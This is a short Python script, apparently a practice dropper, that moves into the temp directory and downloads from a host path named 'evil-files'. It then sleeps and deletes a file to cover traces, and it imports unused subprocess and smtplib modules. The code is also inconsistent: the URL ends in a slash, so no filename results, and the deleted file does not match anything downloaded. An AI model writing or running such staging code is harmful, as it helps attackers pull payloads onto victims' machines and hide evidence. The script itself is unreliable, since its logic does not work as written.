#!/usr/bin/env python
import requests, subprocess, smtplib, os, tempfile, time

def download(url):
    resp = requests.get(url)
    filename = url.split('/')[-1]
    with open(filename, 'wb') as output:
        output.write(resp.content)


temp_dir = tempfile.gettempdir()
os.chdir(temp_dir)
print(f'[*] Temp dir: {temp_dir}')
download('http://10.0.2.15/evil-files/')
print('[-] Deleting after a nap...')
time.sleep(30)
os.remove('maxresdefault.jpg')
